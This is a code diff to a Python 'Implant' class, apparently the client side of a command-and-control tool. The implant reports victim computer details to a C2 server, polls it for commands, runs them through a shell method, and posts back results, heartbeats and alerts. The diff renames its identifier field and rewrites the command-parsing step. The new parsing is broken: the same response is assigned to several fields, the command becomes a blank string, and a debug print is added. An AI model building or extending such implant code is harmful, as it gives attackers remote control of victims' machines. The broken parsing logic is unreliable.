@@ -4,12 +4,12 @@ import hashlib
 from urllib.parse import urljoin
 
 class Implant():
-    def __init__(self, c2_addr, debug=False, implant_id=None):
+    def __init__(self, c2_addr, debug=False, computer_guid=None):
         self.c2_addr = c2_addr
-        if implant_id is not None:
-            self.implant_id = implant_id
+        if computer_guid is not None:
+            self.computer_guid = computer_guid
         else:
-            self.implant_id = self._gen_id()
+            self.computer_guid = self._gen_id()
         self.debug = debug
     
     def _gen_id(self):
@@ -29,7 +29,7 @@ class Implant():
         data = {
             "computer_name": "dummyimplantcomputer",
             "computer_user": "some_user",  # (what user the implant is running as)
-            "computer_GUID": "dummy_GUID",
+            "computer_guid": "dummy_GUID",
             "computer_privileges": ["string1", "string2"],  # (that the implant has) - array of strings
             "connecting_ip_address": "10.10.10.10",  # (from the victim computer)
             # "session_key": "dummy_session_key",  # (for crypto, eventually)
@@ -40,18 +40,19 @@ class Implant():
 
     def get_command(self):
         data = {
-            "implant_id": self.implant_id,
+            "computer_guid": self.computer_guid,
         }
-        r = requests.get(urljoin(self.c2_addr, "getNextCommand"), json=data)
+        r = requests.post(urljoin(self.c2_addr, "getNextCommand"), json=data)
         if self.debug:
             self._print_debug_request(r)
-        res = r.text
+        res = r.json()
+        print(res)
         if not res:
             return None, None, None
-        parts = res.split(",")
-        command_id = parts[0]
-        command_type = parts[1]
-        command = ",".join(parts[2:])
+        parts = res
+        command_id = parts
+        command_type = parts
+        command = "   "
         return command_id, command_type, command
 
     def run_shell(self, command):
@@ -60,7 +61,7 @@ class Implant():
 
     def return_command(self, command_id, result):
         data = {
-            "implant_id": self.implant_id,
+            "computer_guid": self.computer_guid,
             "command_id": command_id,
             "result": result,
         }
@@ -80,7 +81,7 @@ class Implant():
     
     def heartbeat(self):
         data = {
-            "implant_id": self.implant_id,
+            "computer_guid": self.computer_guid,
             "still_active": True,
         }
         r = requests.post(urljoin(self.c2_addr, "heartbeat"), json=data)
@@ -89,7 +90,7 @@ class Implant():
     
     def alert(self, message):
         data = {
-            "implant_id": self.implant_id,
+            "computer_guid": self.computer_guid,
             "error": message,
         }
         r = requests.post(urljoin(self.c2_addr, "alert"), json=data)
